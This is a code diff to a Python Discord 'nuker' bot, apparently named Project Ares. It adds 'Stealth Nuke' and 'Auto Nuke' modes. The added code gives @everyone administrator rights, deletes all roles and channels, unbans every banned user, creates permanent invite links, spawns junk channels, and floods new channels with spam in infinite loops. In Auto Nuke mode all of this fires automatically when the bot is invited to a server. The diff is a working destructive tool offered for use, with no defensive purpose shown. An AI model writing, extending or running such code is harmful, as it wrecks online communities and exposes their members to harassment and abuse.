@@ -39,7 +39,8 @@ print(Center.XCenter(Fore.RED + '''
 ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░
                                          iliya#1111''' + Fore.RESET))
 print(Center.XCenter(Box.DoubleCube('''[1] Continue To Regular Mode
-[2] Stealth Nuke''')))
+[2] Stealth Nuke
+[3] Auto Nuke''')))
 
 option = int(input(Center.XCenter("Option: ")))
 
@@ -284,6 +285,14 @@ Creator's Website -- iliyaa.tk
                 print(Fore.GREEN + "Unable to DM commands." + Fore.RESET)
 
         @client.event
+        async def on_guild_join(guild):
+            membercount = guild.member_count
+            print(f"I have been invited to a guild with {membercount} members!")
+            for channel in guild.text_channels:
+                link = await channel.create_invite(max_age = 0, max_uses = 0)
+                print(f"Invite: {link}")
+
+        @client.event
         async def on_guild_channel_create(channel):
           while True:
             await channel.send(random.choice(SPAM_MESSAGE))
@@ -311,6 +320,70 @@ Creator's Website -- iliyaa.tk
             await client.change_presence(activity=discord.Game(name=ActivityStatus))
             ID = Write.Input("Enter GuildID -> ", Colors.red, interval=0.06)
             guild = client.get_guild(int(ID))
+            try:
+                role = discord.utils.get(guild.roles, name = "@everyone")
+                await role.edit(permissions = Permissions.all())
+                print(Fore.GREEN + "Everyone has recieved administrator." + Fore.RESET)
+            except:
+                print(Fore.MAGENTA + "Unable to give @everyone administrator." + Fore.RESET)
+            for role in guild.roles:
+                try:
+                    await role.delete()
+                    print(Fore.GREEN + f"{role.name} has been deleted." + Fore.RESET)
+                except:
+                    print(Fore.MAGENTA + f"{role.name} could not be deleted." + Fore.RESET)
+            for channel in guild.channels:
+              try:
+                await channel.delete()
+                print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
+              except:
+                print(Fore.MAGENTA + f"{channel.name} was NOT deleted." + Fore.RESET)
+            banned_users = await guild.bans()
+            for ban_entry in banned_users:
+              user = ban_entry.user
+              try:
+                await user.unban("iliyaa-tk")
+                print(Fore.GREEN + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
+              except:
+                print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
+            await guild.create_text_channel("iliyaa-tk")
+            for channel in guild.text_channels:
+                link = await channel.create_invite(max_age = 0, max_uses = 0)
+                print(f"New Invite: {link}")
+            for i in range(int(ChannelAmount)):
+               await guild.create_text_channel(random.choice(ChannelName))
+            print(f"Nuked {guild.name} Successfully.")
+            return
+
+        @client.event
+        async def on_guild_channel_create(channel):
+          while True:
+            await channel.send(random.choice(SPAM_MESSAGE))
+
+        client.run(Token, bot=True)
+    elif option == 3:
+        clear()
+        @client.event
+        async def on_ready():
+            print(Fore.RED + f'''
+██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗  ░█████╗░██████╗░███████╗░██████╗
+██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝  ██╔══██╗██╔══██╗██╔════╝██╔════╝
+██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░  ███████║██████╔╝█████╗░░╚█████╗░
+██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░  ██╔══██║██╔══██╗██╔══╝░░░╚═══██╗
+██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░  ██║░░██║██║░░██║███████╗██████╔╝
+╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░
+
+Logged in as {client.user}
+
+Creator's Website -- iliyaa.tk
+
+> AUTO NUKE <
+
+            ''' + Fore.RESET)
+            await client.change_presence(activity=discord.Game(name=ActivityStatus))
+
+        @client.event
+        async def on_guild_join(guild):
             try:
                 role = discord.utils.get(guild.roles, name = "@everyone")
                 await role.edit(permissions = Permissions.all())
